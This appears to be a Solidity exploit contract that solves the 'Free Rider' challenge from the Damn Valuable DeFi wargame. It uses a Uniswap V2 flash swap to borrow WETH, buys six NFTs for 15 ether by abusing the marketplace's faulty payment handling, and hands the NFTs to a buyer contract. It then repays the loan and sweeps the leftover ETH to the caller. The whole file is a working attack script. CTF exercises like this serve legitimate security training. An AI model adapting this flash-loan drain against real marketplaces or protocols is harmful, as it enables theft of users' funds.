// SPDX-License-Identifier: MIT
pragma solidity >=0.8.1;

import {IUniswapV2Pair} from "./Interfaces.sol";
import {WETH9} from "../WETH9.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    uint8 internal constant AMOUNT_OF_NFTS = 6;

    IUniswapV2Pair private immutable pair;
    WETH9 private immutable weth;
    FreeRiderNFTMarketplace private immutable freeRiderNFTMarketplace;
    DamnValuableNFT private immutable nft;
    address private immutable buyer;

    constructor(
        address _weth,
        address _uniV2Pair,
        address _nftMarketplace,
        address _buyerContract,
        address _nft
    ) {
        weth = WETH9(payable(_weth));
        pair = IUniswapV2Pair(_uniV2Pair);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(
            payable(_nftMarketplace)
        );
        buyer = _buyerContract;
        nft = DamnValuableNFT(_nft);
    }

    function flashSwap(uint256 wethAmount) external {
        //Request flashloan
        bytes memory data = abi.encode(address(weth), msg.sender);
        // amount0Out is DVT, amount1Out is WETH
        pair.swap(0, wethAmount, address(this), data);
    }

    // This function is called by the Uniswap DVT/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, address caller) = abi.decode(
            data,
            (address, address)
        );

        require(tokenBorrow == address(weth), "token borrow != WETH");

        // Convert WETH to ETH
        weth.withdraw(amount1);

        // Buy NFT from the market place
        uint256[] memory tokenIds = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);

        // Send NFTs to buyer
        nft.setApprovalForAll(buyer, true);
        for (uint8 i = 0; i < tokenIds.length; ) {
            nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
            unchecked {
                ++i;
            }
        }

        // Calculate amount to repay
        uint256 amountToRepay;
        // about 0.3% fee, +1 to round up
        uint256 fee = (amount1 * 3) / 997 + 1;
        amountToRepay = amount1 + fee;

        // Convert amountToRepay from ETH to WETH

        weth.deposit{value: amountToRepay}();
        weth.approve(msg.sender, amountToRepay);
        //Repay flashloan
        weth.transfer(address(pair), amountToRepay);
        // Send all eth to caller
        payable(caller).sendValue(address(this).balance);
    }

    // This function is required to recived NFT from NFT marketplace
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
